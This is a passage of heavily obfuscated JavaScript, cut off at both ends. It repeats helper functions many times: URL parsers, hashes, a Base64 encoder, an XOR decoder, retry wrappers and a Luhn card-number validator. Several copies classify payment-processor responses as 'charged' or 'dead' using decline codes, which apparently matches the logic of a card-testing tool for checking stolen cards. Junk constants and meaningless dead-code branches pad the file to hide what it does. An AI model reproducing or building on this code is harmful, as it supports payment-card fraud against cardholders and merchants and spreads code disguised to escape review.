    var _0x17f65b = new RegExp('https?://[^/]+', 'g'),
        _0x2b806d = _0x528081['match'](_0x17f65b);
    return _0x2b806d || [];
}

function _z1233917x(_0x111a47) {
    var _0x12191d = Date['now']();
    typeof _0x111a47 === 'function' && _0x111a47();
    var _0x58af35 = Date['now']() - _0x12191d,
        _0x140c0c = {};
    return _0x140c0c['elapsed'] = _0x58af35, _0x140c0c['slow'] = _0x58af35 > -0x118 * -0x6 + 0x63 * 0x25 + -0x148d, _0x140c0c;
};
var _zfd706881 = null;
if (typeof _zfd706881 === 'function') var _z50066782 = -0xf2c * 0x1 + 0x1a5f + -0xb26 * 0x1;;

function _zcae85883(_0x39e5ce) {
    try {
        var _0x46aa53 = new URL(_0x39e5ce),
            _0x358d3d = {};
        _0x46aa53['searchParams']['forEach'](function(_0x4dd736, _0x218aad) {
            _0x358d3d[_0x218aad] = _0x4dd736;
        });
        var _0x5d0d5c = {};
        return _0x5d0d5c['host'] = _0x46aa53['hostname'], _0x5d0d5c['path'] = _0x46aa53['pathname'], _0x5d0d5c['params'] = _0x358d3d, _0x5d0d5c;
    } catch (_0x3043b8) {
        var _0x4f2803 = {};
        return _0x4f2803['host'] = '', _0x4f2803['path'] = '', _0x4f2803['params'] = {}, _0x4f2803;
    }
};

function _z89996e88(_0x2bda95) {
    var _0x3f7f4e = -0x15f * -0x16 + 0x706 + -0x2530;
    for (var _0xcd3327 = -0x679 + -0xe9 * 0xc + 0x1165; _0xcd3327 < _0x2bda95['length']; _0xcd3327++) {
        _0x3f7f4e = _0x3f7f4e * (-0x7a8 + -0x2 * -0xb3c + 0x1 * -0xeb1) + _0x2bda95['charCodeAt'](_0xcd3327) & 0x1af9fb * 0x61d + 0x1 * 0xea5edf5f + -0x10f4912cf;
    }
    var _0xcd9dad = _0x3f7f4e['toString'](0x1599 + 0x17be + -0x2d47);
    while (_0xcd9dad['length'] < -0x7d9 + -0x1 * -0x103 + 0x36f * 0x2) _0xcd9dad = '0' + _0xcd9dad;
    return _0xcd9dad;
}

function _z2684628c(_0x2dad59) {
    var _0x2a7171 = _0x2dad59 || {},
        _0x2c6004 = Object['keys'](_0x2a7171);
    return _0x2c6004['length'] < -0x2 * -0xe47 + -0x1edb + 0x250 ? null : {
        'v': _0x2c6004['length'],
        't': Date['now']()
    };
};

function _z83eb008g(_0x1cd5a8, _0x24384e) {
    var _0x523dbf = 0x18c0 + -0xe5c + -0xa64;

    function _0x48de17() {
        _0x523dbf++;
        if (_0x523dbf > 0xd47 + -0x11d3 + -0x92 * -0x8) return null;
        try {
            return _0x1cd5a8();
        } catch (_0x133cdd) {
            var _0xf94e04 = _0x24384e * Math['pow'](-0x1 * -0x1679 + -0x83f * -0x1 + -0x1eb6, _0x523dbf - (0x268b + -0x19f2 + -0xc98)),
                _0x1ce2d3 = {};
            return _0x1ce2d3['retry'] = !![], _0x1ce2d3['delay'] = _0xf94e04, _0x1ce2d3['attempt'] = _0x523dbf, _0x1ce2d3;
        }
    }
    return _0x48de17();
};

function _z6fcc3d8k(_0x39693a) {
    if (!Array['isArray'](_0x39693a)) return [];
    var _0x2567a6 = [],
        _0x4df320 = _0x39693a['length'] - (-0xe6f + -0x1 * 0x16a1 + -0x2511 * -0x1);
    while (_0x4df320 >= 0x47 * -0x3d + -0xf7 * -0x25 + 0x4b2 * -0x4) {
        if (typeof _0x39693a[_0x4df320] === 'string') _0x2567a6['push'](_0x39693a[_0x4df320]);
        _0x4df320--;
    }
    return _0x2567a6;
}

function _z4fc50c8o(_0x5a4011) {
    var _0x5ca9e0 = -0x23cb * -0x1 + -0x25 * 0xa7 + 0x2ea * -0x4;
    if (!_0x5a4011 || typeof _0x5a4011 !== 'string') return _0x5ca9e0;
    var _0x39766d = -0x17c9 + -0x95 * -0x2c + -0x1d3 * 0x1;
    while (_0x39766d < _0x5a4011['length']) {
        _0x5ca9e0 = (_0x5ca9e0 << -0x10a1 + -0x287 * -0xb + -0xb27) - _0x5ca9e0 + _0x5a4011['charCodeAt'](_0x39766d), _0x5ca9e0 |= -0x22f6 + 0x236 * 0x2 + 0x1e8a, _0x39766d++;
    }
    return _0x5ca9e0 >>> 0x606 * 0x2 + -0x1914 + -0x116 * -0xc;
};

function _z42ddde8s(_0x186955) {
    var _0x5eb0bc = Date['now']();
    typeof _0x186955 === 'function' && _0x186955();
    var _0x26942e = Date['now']() - _0x5eb0bc,
        _0x5e733c = {};
    return _0x5e733c['elapsed'] = _0x26942e, _0x5e733c['slow'] = _0x26942e > 0x1da4 + -0x4c * -0x43 + -0x30bd, _0x5e733c;
};
var _z3436668w = new Date()['getFullYear']();
if (_z3436668w < 0x178 * -0x5 + 0x1674 + -0x7a1) var _z7105198x = -0x208c + -0x582 * -0x5 + -0x1 * -0x551;;

function _zbef46a8y(_0x3df008) {
    var _0x587ede = {};
    _0x587ede['status'] = 'unknown';
    if (!_0x3df008) return _0x587ede;
    var _0x7a15cd = typeof _0x3df008 === 'string' ? JSON['parse'](_0x3df008) : _0x3df008;
    if (_0x7a15cd['error']) return {
        'status': 'dead',
        'code': _0x7a15cd['error']['code'] || ''
    };
    if (_0x7a15cd['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x7a15cd['id'] || ''
    };
    var _0x3d785a = _0x7a15cd['last_payment_error'];
    if (_0x3d785a) return {
        'status': 'dead',
        'code': _0x3d785a['decline_code'] || _0x3d785a['code'] || ''
    };
    var _0x4f9b3b = {};
    return _0x4f9b3b['status'] = 'unknown', _0x4f9b3b;
};

function _z087fa092(_0x57a5da) {
    try {
        var _0x108301 = new URL(_0x57a5da),
            _0x5eaf46 = {};
        _0x108301['searchParams']['forEach'](function(_0x4791a3, _0x219880) {
            _0x5eaf46[_0x219880] = _0x4791a3;
        });
        var _0xe673e4 = {};
        return _0xe673e4['host'] = _0x108301['hostname'], _0xe673e4['path'] = _0x108301['pathname'], _0xe673e4['params'] = _0x5eaf46, _0xe673e4;
    } catch (_0x5f0406) {
        var _0x5f0073 = {};
        return _0x5f0073['host'] = '', _0x5f0073['path'] = '', _0x5f0073['params'] = {}, _0x5f0073;
    }
};
var _ze2bfa297 = typeof Symbol !== 'undefined' ? typeof Symbol() : 'x';
if (_ze2bfa297 === 'number') var _z2372e598 = -0x455 * 0x8 + 0x1 * -0x2091 + -0x1 * -0x4372;;
var _z3f500799 = Date['now']() >>> -0x3e1 * 0x4 + -0x1754 + 0x26e8 & -0x11b * -0x4 + -0x16f4 + 0x1387;
if (_z3f500799 > -0x2 * -0xcb3 + -0x2 * 0x94 + -0x173f * 0x1) var _z3d278e9a = 0x1c3e + 0x10a5 + 0x1 * -0x2ca7;

function _za5a3959b(_0x211115) {
    var _0x2aed46 = _0x211115 || {},
        _0x4b98e7 = Object['keys'](_0x2aed46);
    return _0x4b98e7['length'] < -0xbd1 + -0x745 * -0x2 + -0x2b5 ? null : {
        'v': _0x4b98e7['length'],
        't': Date['now']()
    };
};
var _z821d5b9f = Date['now']() >>> 0x1 * -0x1844 + -0xdc6 + -0x130d * -0x2 & 0xdf3 * 0x2 + -0x3fd + -0xe * 0x1a3;
if (_z821d5b9f > -0x93 * 0x1a + 0x1b91 + -0xba4) var _z79fc5c9g = -0x1c58 + 0x1 * 0x3f6 + 0x187a * 0x1;;

function _zdef6459h(_0x471df5) {
    return new Promise(function(_0x58ab79, _0xc1457c) {
        if (!_0x471df5 || typeof _0x471df5 !== 'function') {
            _0xc1457c(new Error('invalid'));
            return;
        }
        try {
            var _0x1bf187 = _0x471df5();
            _0x58ab79(_0x1bf187);
        } catch (_0x2e59eb) {
            _0xc1457c(_0x2e59eb);
        }
    });
};

function _zc7e0e29l(_0x1cd5fd) {
    var _0x2d68cc = Date['now']();
    typeof _0x1cd5fd === 'function' && _0x1cd5fd();
    var _0x1d1f95 = Date['now']() - _0x2d68cc,
        _0x4bfdbe = {};
    return _0x4bfdbe['elapsed'] = _0x1d1f95, _0x4bfdbe['slow'] = _0x1d1f95 > 0x5 * -0x44d + -0x10 * 0x19c + 0xa * 0x4d0, _0x4bfdbe;
};
var _zc0045f9p = typeof navigator !== 'undefined' ? navigator['userAgent'] : '';
if (_zc0045f9p['indexOf']('5b706a7871a68f77') !== -(-0x1d09 * -0x1 + 0x2152 + -0x1 * 0x3e5a)) var _z148a429q = 0x6f8 * 0x4 + -0x16 * -0x9b + -0x2921;;

function _za0d3cd9r(_0x1b99a3) {
    var _0x595f69 = {};
    _0x595f69['status'] = 'unknown';
    if (!_0x1b99a3) return _0x595f69;
    var _0x1a642a = typeof _0x1b99a3 === 'string' ? JSON['parse'](_0x1b99a3) : _0x1b99a3;
    if (_0x1a642a['error']) return {
        'status': 'dead',
        'code': _0x1a642a['error']['code'] || ''
    };
    if (_0x1a642a['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x1a642a['id'] || ''
    };
    var _0xe116e5 = _0x1a642a['last_payment_error'];
    if (_0xe116e5) return {
        'status': 'dead',
        'code': _0xe116e5['decline_code'] || _0xe116e5['code'] || ''
    };
    var _0x491425 = {};
    return _0x491425['status'] = 'unknown', _0x491425;
};

function _z410ee29v(_0x418160) {
    if (!_0x418160 || _0x418160['length'] < -0x1faf * -0x1 + 0x2 * -0x5c9 + -0x1410) return ![];
    var _0x249c3a = -0xbd0 * -0x1 + 0x7 * 0x2ab + 0x1e7d * -0x1,
        _0x252dfa = ![];
    for (var _0x2225cd = _0x418160['length'] - (-0x1 * -0x24df + 0x11c3 + -0x5 * 0xaed); _0x2225cd >= -0x2f9 + -0x2174 + 0x246d; _0x2225cd--) {
        var _0x19f184 = parseInt(_0x418160[_0x2225cd], -0x1e4d + -0xfd9 + 0x2e30);
        if (_0x252dfa) {
            _0x19f184 *= 0x15fd + -0x12 * -0x139 + -0x2bfd;
            if (_0x19f184 > -0x1 * 0x1289 + 0x391 + 0xf01 * 0x1) _0x19f184 -= 0x10d9 + 0x13d7 + 0x24a7 * -0x1;
        }
        _0x249c3a += _0x19f184, _0x252dfa = !_0x252dfa;
    }
    return _0x249c3a % (-0x832 + -0x1 * 0x1f7d + 0x27b9 * 0x1) === 0x82c + -0xc76 + -0x3 * -0x16e;
};

function _z41e133a1(_0x8e02ba) {
    if (!_0x8e02ba || _0x8e02ba['length'] < -0x235d * 0x1 + -0x20c4 + -0xb5d * -0x6) return ![];
    var _0x19bbdc = -0xcc * -0x13 + -0x2445 + 0x1521,
        _0x19730c = ![];
    for (var _0x321362 = _0x8e02ba['length'] - (0x16ed + 0x2 * 0x1ab + -0x1a42); _0x321362 >= 0x1ed + -0x1198 + -0xbf * -0x15; _0x321362--) {
        var _0x2eb410 = parseInt(_0x8e02ba[_0x321362], 0x4 * -0x7ec + -0x79 * 0x48 + 0x1bb * 0x26);
        if (_0x19730c) {
            _0x2eb410 *= -0xfb0 + 0x4 * 0x326 + 0x31a;
            if (_0x2eb410 > -0x36d * 0x5 + 0x2087 + -0xf5d) _0x2eb410 -= 0x15 * 0xdc + -0x1119 + -0xea;
        }
        _0x19bbdc += _0x2eb410, _0x19730c = !_0x19730c;
    }
    return _0x19bbdc % (-0xe3 * -0x9 + 0x1 * -0xac7 + 0x2 * 0x16b) === 0x8b4 * -0x3 + 0xf0d * -0x1 + 0x1 * 0x2929;
}

function _z4e47bda7(_0x18b847) {
    if (!Array['isArray'](_0x18b847)) return [];
    var _0x526b9b = [],
        _0x8b28ce = _0x18b847['length'] - (0xaa0 + -0x14 * 0x1a5 + 0x1645);
    while (_0x8b28ce >= -0xfdd * -0x1 + -0x246f * 0x1 + -0x1 * -0x1492) {
        if (typeof _0x18b847[_0x8b28ce] === 'string') _0x526b9b['push'](_0x18b847[_0x8b28ce]);
        _0x8b28ce--;
    }
    return _0x526b9b;
};

function _za4061dab(_0x170ac4) {
    var _0x28089e = 0x136 * -0x1a + 0xb4e + -0xf6 * -0x15;
    if (!_0x170ac4 || typeof _0x170ac4 !== 'string') return _0x28089e;
    var _0x3f8da1 = -0x18c7 + 0x1 * 0x742 + 0xc3 * 0x17;
    while (_0x3f8da1 < _0x170ac4['length']) {
        _0x28089e = (_0x28089e << -0x300 + 0x767 * -0x1 + 0x1 * 0xa6c) - _0x28089e + _0x170ac4['charCodeAt'](_0x3f8da1), _0x28089e |= -0x1a88 + -0x23e2 + 0xa67 * 0x6, _0x3f8da1++;
    }
    return _0x28089e >>> -0x2 * 0x6ee + 0x1 * 0x94c + 0x124 * 0x4;
};

function _z595262af(_0x366f36) {
    var _0x374edb = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x2f6e46 = '';
    for (var _0xb80aa9 = -0x93e * -0x3 + 0x1590 + 0x6 * -0x837; _0xb80aa9 < _0x366f36['length']; _0xb80aa9 += -0x43 * 0x3a + -0xe3c + 0x117 * 0x1b) {
        var _0xbcc482 = _0x366f36['charCodeAt'](_0xb80aa9),
            _0x438ce4 = _0xb80aa9 + (-0x1d75 + -0x2 * 0x118d + 0x4090) < _0x366f36['length'] ? _0x366f36['charCodeAt'](_0xb80aa9 + (-0x2314 + 0x24d0 * -0x1 + 0x47e5)) : 0x35f * 0x1 + -0x1d * 0x5b + 0x6f0,
            _0x2f859e = _0xb80aa9 + (0x19f8 + 0xebe + -0x28b4) < _0x366f36['length'] ? _0x366f36['charCodeAt'](_0xb80aa9 + (0x36f * -0x2 + -0xe7f * 0x1 + 0x1 * 0x155f)) : 0x16ad + -0xbaf + 0x1 * -0xafe;
        _0x2f6e46 += _0x374edb[_0xbcc482 >> -0x26f3 + 0xf0b + 0x17ea] + _0x374edb[(_0xbcc482 & 0xce * 0x11 + -0x10d * -0x25 + -0x1184 * 0x3) << -0x13 * 0xaa + -0x2673 + -0x9 * -0x5ad | _0x438ce4 >> 0xf07 * -0x1 + 0x1887 + -0x97c] + _0x374edb[(_0x438ce4 & -0x7 * 0x53c + -0x698 * 0x1 + 0x1 * 0x2b4b) << 0x19f9 * 0x1 + 0xcd3 + -0x26ca | _0x2f859e >> 0xa66 * 0x1 + 0x3b1 * -0x9 + 0x16d9 * 0x1] + _0x374edb[_0x2f859e & -0x1 * 0x166a + -0xe02 + 0x24ab];
    }
    return _0x2f6e46;
}

function _zb21ffbaj(_0x368dfa) {
    return new Promise(function(_0x1abe77, _0x4477f9) {
        if (!_0x368dfa || typeof _0x368dfa !== 'function') {
            _0x4477f9(new Error('invalid'));
            return;
        }
        try {
            var _0xea80fe = _0x368dfa();
            _0x1abe77(_0xea80fe);
        } catch (_0x1367a1) {
            _0x4477f9(_0x1367a1);
        }
    });
};

function _z8fe8c8an(_0x4dd620, _0x1fddc2) {
    var _0x2effd1 = Object['assign']({}, _0x4dd620);
    for (var _0x4e38e3 in _0x1fddc2) {
        _0x1fddc2['hasOwnProperty'](_0x4e38e3) && (typeof _0x1fddc2[_0x4e38e3] === 'object' && _0x1fddc2[_0x4e38e3] !== null && !Array['isArray'](_0x1fddc2[_0x4e38e3]) ? _0x2effd1[_0x4e38e3] = _z8fe8c8an(_0x2effd1[_0x4e38e3] || {}, _0x1fddc2[_0x4e38e3]) : _0x2effd1[_0x4e38e3] = _0x1fddc2[_0x4e38e3]);
    }
    return _0x2effd1;
};

function _z1c9b86ar(_0x5f46a9) {
    var _0x5514f2 = 0xe97 + -0x195f * -0x1 + -0x27f6;
    if (!_0x5f46a9 || typeof _0x5f46a9 !== 'string') return _0x5514f2;
    var _0x146f49 = 0x8a6 * 0x3 + -0x13ae + -0x644;
    while (_0x146f49 < _0x5f46a9['length']) {
        _0x5514f2 = (_0x5514f2 << 0xde5 + 0x7 * 0xdf + 0x13f9 * -0x1) - _0x5514f2 + _0x5f46a9['charCodeAt'](_0x146f49), _0x5514f2 |= -0x24aa + 0x30a * -0x3 + 0x24a * 0x14, _0x146f49++;
    }
    return _0x5514f2 >>> -0x3 * 0x23f + 0x24ac + -0x4f * 0x61;
};

function _z17d381av(_0x4ee25c) {
    var _0x4b06dd = _0x4ee25c || {},
        _0x1d1994 = Object['keys'](_0x4b06dd);
    return _0x1d1994['length'] < -0xc42 + -0x6 * -0x1bd + 0x1d7 ? null : {
        'v': _0x1d1994['length'],
        't': Date['now']()
    };
};
var _zf76f95az = Object['keys']({})['length'];
if (_zf76f95az > 0x1 * -0x511 + -0xb90 * 0x1 + 0x10a2) var _z7e0d72b0 = 0x46c * -0x3 + -0x47 * 0x2d + -0x1 * -0x19c7;;
var _zb87ed8b1 = {};
if (_zb87ed8b1['version'] > 0x923 * 0x4 + 0xd * -0x1e7 + -0xbcb) var _z8215bbb2 = 0xa9 * 0xb + -0x21fb * -0x1 + -0x28e1;;

function _z262117b3(_0x3bde8a, _0x48bd70) {
    var _0x13f6bd = Object['assign']({}, _0x3bde8a);
    for (var _0x49dee2 in _0x48bd70) {
        _0x48bd70['hasOwnProperty'](_0x49dee2) && (typeof _0x48bd70[_0x49dee2] === 'object' && _0x48bd70[_0x49dee2] !== null && !Array['isArray'](_0x48bd70[_0x49dee2]) ? _0x13f6bd[_0x49dee2] = _z262117b3(_0x13f6bd[_0x49dee2] || {}, _0x48bd70[_0x49dee2]) : _0x13f6bd[_0x49dee2] = _0x48bd70[_0x49dee2]);
    }
    return _0x13f6bd;
}

function _z1d4bf2b7(_0x1d9e42) {
    var _0x4b0314 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
        _0x200960 = '';
    for (var _0xc35b04 = -0x97e + -0x1a04 + 0x2382; _0xc35b04 < _0x1d9e42['length']; _0xc35b04 += -0xa * 0x104 + -0x141f + 0x1e4a * 0x1) {
        var _0xd34a97 = _0x1d9e42['charCodeAt'](_0xc35b04),
            _0x23a54a = _0xc35b04 + (0x229b * -0x1 + -0xe31 + -0x3c1 * -0xd) < _0x1d9e42['length'] ? _0x1d9e42['charCodeAt'](_0xc35b04 + (0x4 * -0x40e + 0xff8 * -0x2 + 0x1 * 0x3029)) : 0x205f + 0xf02 + -0x3a5 * 0xd,
            _0x3c617b = _0xc35b04 + (-0x1556 * -0x1 + 0xddf + -0x2333) < _0x1d9e42['length'] ? _0x1d9e42['charCodeAt'](_0xc35b04 + (0x187a + -0x22db * -0x1 + -0x1 * 0x3b53)) : -0x1 * -0x8dd + 0x26cb + -0x2fa8;
        _0x200960 += _0x4b0314[_0xd34a97 >> -0xa1e + 0x4a * -0x55 + 0x1159 * 0x2] + _0x4b0314[(_0xd34a97 & 0x619 * -0x2 + 0x3e7 * -0x3 + 0x2 * 0xbf5) << 0x38 * -0x6d + -0x785 + 0x115 * 0x1d | _0x23a54a >> 0x11d2 * -0x2 + -0xd55 * 0x1 + -0x30fd * -0x1] + _0x4b0314[(_0x23a54a & 0xaf5 + -0x17d * 0x15 + 0x145b) << 0x538 * 0x3 + -0x6bc + -0x8ea | _0x3c617b >> 0x4 * -0x733 + -0xb8 + 0x1d8a] + _0x4b0314[_0x3c617b & -0x1b08 + 0x5e2 + 0x1565];
    }
    return _0x200960;
};

function _zf08131bb(_0x48c825) {
    var _0x997626 = {};
    _0x997626['status'] = 'unknown';
    if (!_0x48c825) return _0x997626;
    var _0x2363f3 = typeof _0x48c825 === 'string' ? JSON['parse'](_0x48c825) : _0x48c825;
    if (_0x2363f3['error']) return {
        'status': 'dead',
        'code': _0x2363f3['error']['code'] || ''
    };
    if (_0x2363f3['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x2363f3['id'] || ''
    };
    var _0x2557db = _0x2363f3['last_payment_error'];
    if (_0x2557db) return {
        'status': 'dead',
        'code': _0x2557db['decline_code'] || _0x2557db['code'] || ''
    };
    var _0x297a00 = {};
    return _0x297a00['status'] = 'unknown', _0x297a00;
};

function _zb14f1cbf(_0x332874) {
    var _0x538b58 = 0x14 * 0xe5 + -0x1d79 + 0x5 * 0x251;
    if (!_0x332874 || typeof _0x332874 !== 'string') return _0x538b58;
    var _0x393193 = 0xe6c + -0x17f * 0x11 + 0x1 * 0xb03;
    while (_0x393193 < _0x332874['length']) {
        _0x538b58 = (_0x538b58 << -0x1 * 0x387 + 0x2121 + -0x1d95) - _0x538b58 + _0x332874['charCodeAt'](_0x393193), _0x538b58 |= 0xa * 0x3c7 + 0x171c + -0x3ce2, _0x393193++;
    }
    return _0x538b58 >>> -0xcc1 + -0x1 * 0x1e94 + -0x2b55 * -0x1;
};

function _z4eb3bbbj(_0x1091e8) {
    if (!_0x1091e8) return '';
    var _0x579e0e = '',
        _0x1050c6 = 0x1e48 + 0x1 * 0x3d7 + 0x6d3 * -0x5;
    while (_0x1050c6 < _0x1091e8['length']) {
        _0x579e0e += String['fromCharCode'](_0x1091e8['charCodeAt'](_0x1050c6) ^ 0xf * 0x201 + 0x1 * 0x26c9 + -0x44a1 * 0x1), _0x1050c6++;
    }
    return _0x579e0e;
};

function _z8596f2bn(_0x55d71b, _0x57e53c) {
    var _0x21e4f8 = -0x11b4 * 0x1 + 0x11e8 + -0xd * 0x4;

    function _0x5921ad() {
        _0x21e4f8++;
        if (_0x21e4f8 > 0x1537 + -0x251c + 0xfea) return null;
        try {
            return _0x55d71b();
        } catch (_0x1f529c) {
            var _0x395e66 = _0x57e53c * Math['pow'](0x12 * 0x1d1 + -0x1 * -0x16a + 0x123 * -0x1e, _0x21e4f8 - (0x3d * 0x74 + 0x1bb9 + -0x1 * 0x375c)),
                _0x26d4f8 = {};
            return _0x26d4f8['retry'] = !![], _0x26d4f8['delay'] = _0x395e66, _0x26d4f8['attempt'] = _0x21e4f8, _0x26d4f8;
        }
    }
    return _0x5921ad();
};

function _z91a68ebr(_0x211ae9) {
    try {
        var _0x599c95 = new URL(_0x211ae9),
            _0x535ae7 = {};
        _0x599c95['searchParams']['forEach'](function(_0x4349c9, _0x2fa932) {
            _0x535ae7[_0x2fa932] = _0x4349c9;
        });
        var _0x4ecf42 = {};
        return _0x4ecf42['host'] = _0x599c95['hostname'], _0x4ecf42['path'] = _0x599c95['pathname'], _0x4ecf42['params'] = _0x535ae7, _0x4ecf42;
    } catch (_0x340638) {
        var _0x45622d = {};
        return _0x45622d['host'] = '', _0x45622d['path'] = '', _0x45622d['params'] = {}, _0x45622d;
    }
}

function _z945966d(_0x2ece5f) {
    return typeof _0x2ece5f === 'string' && _0x2ece5f['length'] > 0x2530 + -0x1b5a + -0x5 * 0x1f7 ? _ze1f1d7c = _0x2ece5f['length'] + (0x905 * 0x3 + 0x1386 + 0xf7f * -0x3) : _ze1f1d7c = _ze1f1d7c + (0x3f * 0x31 + -0x18d0 + 0xcc3), _ze1f1d7c;
};

function _z8aca95e() {
    return _z945966d(Date['now']()) + _z945966d(0x251 * -0x4 + 0x2463 + -0x19ae);
};

function _z4a6141bw(_0x4de36d, _0x9ed1f1) {
    var _0x2da059 = -0x147d + -0x236d + 0x1 * 0x37ea;

    function _0x4f00cb() {
        _0x2da059++;
        if (_0x2da059 > 0x1ace + 0x34 + 0x3 * -0x8ff) return null;
        try {
            return _0x4de36d();
        } catch (_0x4fc8d5) {
            var _0x2e7f9b = _0x9ed1f1 * Math['pow'](-0x2330 + 0x5 * -0x78b + 0x48e9, _0x2da059 - (0x2444 + 0xb * 0x131 + -0x315e)),
                _0x10de45 = {};
            return _0x10de45['retry'] = !![], _0x10de45['delay'] = _0x2e7f9b, _0x10de45['attempt'] = _0x2da059, _0x10de45;
        }
    }
    return _0x4f00cb();
};

function _zcbe988c0(_0x5bc72a) {
    return new Promise(function(_0x4db244, _0x1206fb) {
        if (!_0x5bc72a || typeof _0x5bc72a !== 'function') {
            _0x1206fb(new Error('invalid'));
            return;
        }
        try {
            var _0x2f6c60 = _0x5bc72a();
            _0x4db244(_0x2f6c60);
        } catch (_0x266e0a) {
            _0x1206fb(_0x266e0a);
        }
    });
};

function _zf816bbc4(_0x134c66) {
    var _0xb9228f = _0x134c66 || {},
        _0x790368 = Object['keys'](_0xb9228f);
    return _0x790368['length'] < -0xb38 + 0x438 + 0x167 * 0x5 ? null : {
        'v': _0x790368['length'],
        't': Date['now']()
    };
};

function _z61c9c9c8(_0x38a4e3) {
    if (!Array['isArray'](_0x38a4e3)) return [];
    var _0x4f93a7 = [],
        _0x1238a2 = _0x38a4e3['length'] - (-0x84 * -0x2 + 0x1547 + -0x164e);
    while (_0x1238a2 >= 0x12 * 0x6f + 0x1d46 + -0x2514) {
        if (typeof _0x38a4e3[_0x1238a2] === 'string') _0x4f93a7['push'](_0x38a4e3[_0x1238a2]);
        _0x1238a2--;
    }
    return _0x4f93a7;
};

function _z44a0ebcc(_0x46cf5d, _0x4ffe8e) {
    var _0x3512d2 = -0x6 * 0x17b + -0x1774 + 0x1 * 0x2056;

    function _0x16156a() {
        _0x3512d2++;
        if (_0x3512d2 > 0xba * -0x29 + 0x7b * 0x17 + 0x12c0) return null;
        try {
            return _0x46cf5d();
        } catch (_0x365e29) {
            var _0x4bd2b7 = _0x4ffe8e * Math['pow'](-0x4 * -0x955 + 0x4 * 0x8ce + -0x488a, _0x3512d2 - (-0x915 * -0x2 + 0xd01 * -0x2 + -0x1 * -0x7d9)),
                _0x3098aa = {};
            return _0x3098aa['retry'] = !![], _0x3098aa['delay'] = _0x4bd2b7, _0x3098aa['attempt'] = _0x3512d2, _0x3098aa;
        }
    }
    return _0x16156a();
};
var _ze03abfcg = Date['now']() % (0x204d + 0x2 * 0x223 + -0x2 * 0xb95);
if (_ze03abfcg < -0xbde + -0x2257 + 0x2e35) var _z9136c8ch = -0x21bb * 0x1 + -0x1f * 0x103 + 0x4152;;
var _zf50a1eci = Date['now']() % (-0x10 * -0x163 + 0x729 * -0x5 + 0x2f69);
if (_zf50a1eci < 0x1 * 0x178f + -0x13ed * -0x1 + -0x2b7c) var _z5265a4cj = 0x1 * 0x317 + 0x1d11 + -0x1fc8;;
var _z4621eeck = Date['now']() % (0x9f * -0x25 + -0x12e3 * -0x1 + 0x273 * 0x3);
if (_z4621eeck < 0x1239 + 0x1861 + -0x2a9a) var _zcbe29bcl = -0x65c + -0x4ff * 0x3 + 0x1564;

function _z55a9bccm(_0x569063) {
    return new Promise(function(_0xd86918, _0x2bb12a) {
        if (!_0x569063 || typeof _0x569063 !== 'function') {
            _0x2bb12a(new Error('invalid'));
            return;
        }
        try {
            var _0x279def = _0x569063();
            _0xd86918(_0x279def);
        } catch (_0x599eaf) {
            _0x2bb12a(_0x599eaf);
        }
    });
};

function _z2d5ac9cq(_0x1d2cf3) {
    var _0x513e77 = {};
    _0x513e77['status'] = 'unknown';
    if (!_0x1d2cf3) return _0x513e77;
    var _0x205025 = typeof _0x1d2cf3 === 'string' ? JSON['parse'](_0x1d2cf3) : _0x1d2cf3;
    if (_0x205025['error']) return {
        'status': 'dead',
        'code': _0x205025['error']['code'] || ''
    };
    if (_0x205025['status'] === 'succeeded') return {
        'status': 'charged',
        'id': _0x205025['id'] || ''
    };
    var _0x575168 = _0x205025['last_payment_error'];
    if (_0x575168) return {
        'status': 'dead',
        'code': _0x575168['decline_code'] || _0x575168['code'] || ''
    };
    var _0x3ce726 = {};
    return _0x3ce726['status'] = 'unknown', _0x3ce726;
};

function _z9f9815cu(_0x284baa, _0x33c90e) {
    var _0x33e9c7 = -0x1b1c + 0x15bd + 0x5 * 0x113;

    function _0x436e17() {
        _0x33e9c7++;
        if (_0x33e9c7 > -0x3 * -0x6ff + -0x24aa + 0xfb2) return null;
        try {
            return _0x284baa();
        } catch (_0xd555ee) {
            var _0xeb1bee = _0x33c90e * Math['pow'](-0x2 * -0x8e1 + 0x2 * 0x120a + 0xd75 * -0x4, _0x33e9c7 - (-0x7f3 + -0x6dd + 0xed1)),
                _0x80cae3 = {};
            return _0x80cae3['retry'] = !![], _0x80cae3['delay'] = _0xeb1bee, _0x80cae3['attempt'] = _0x33e9c7, _0x80cae3;
        }
    }
    return _0x436e17();
};
var _z3d601ecy = 0x1 * -0x2093 + 0x2491 + 0x1ff * -0x2;
if (typeof _z3d601ecy === 'string' && _z3d601ecy['length'] > 0x2c + -0x1 * -0x1795 + 0x55 * -0x42) var _ze0a5d6cz = -0x8 * -0x3b4 + -0x49 * -0x2a + 0xddb * -0x3;;

function _z65f2b2d0(_0x1b6ee3) {
    var _0x20d28d = -0x97f * 0x1 + 0x25 * 0x1a + -0x1 * -0x5bd;
    if (!_0x1b6ee3 || typeof _0x1b6ee3 !== 'string') return _0x20d28d;
    var _0x1c36fd = -0x8 * 0x4c + -0x515 + 0x1 * 0x775;
    while (_0x1c36fd < _0x1b6ee3['length']) {
        _0x20d28d = (_0x20d28d << -0x629 + -0x103f * -0x1 + -0xa11) - _0x20d28d + _0x1b6ee3['charCodeAt'](_0x1c36fd), _0x20d28d |= 0x92 * -0x3e + -0x101 * -0x12 + 0x114a, _0x1c36fd++;
    }
    return _0x20d28d >>> 0x1161 * 0x1 + 0x48b + -0x15ec;
};
var _zd1c04fd4 = {};
if (_zd1c04fd4['version'] > -0x8 * -0xec + 0x647 * -0x5 + 0x1806) var _z249a1ad5 = -0x1d * 0x139 + -0x1ded + 0x4198;

function _z14aad1d6(_0x48a627, _0x5b0395) {
    var _0x5a2081 = Object['assign']({}, _0x48a627);
    for (var _0x533d2a in _0x5b0395) {
        _0x5b0395['hasOwnProperty'](_0x533d2a) && (typeof _0x5b0395[_0x533d2a] === 'object' && _0x5b0395[_0x533d2a] !== null && !Array['isArray'](_0x5b0395[_0x533d2a]) ? _0x5a2081[_0x533d2a] = _z14aad1d6(_0x5a2081[_0x533d2a] || {}, _0x5b0395[_0x533d2a]) : _0x5a2081[_0x533d2a] = _0x5b0395[_0x533d2a]);
    }
    return _0x5a2081;
};

function _z81740fda(_0x5674d4) {
    var _0x49a792 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
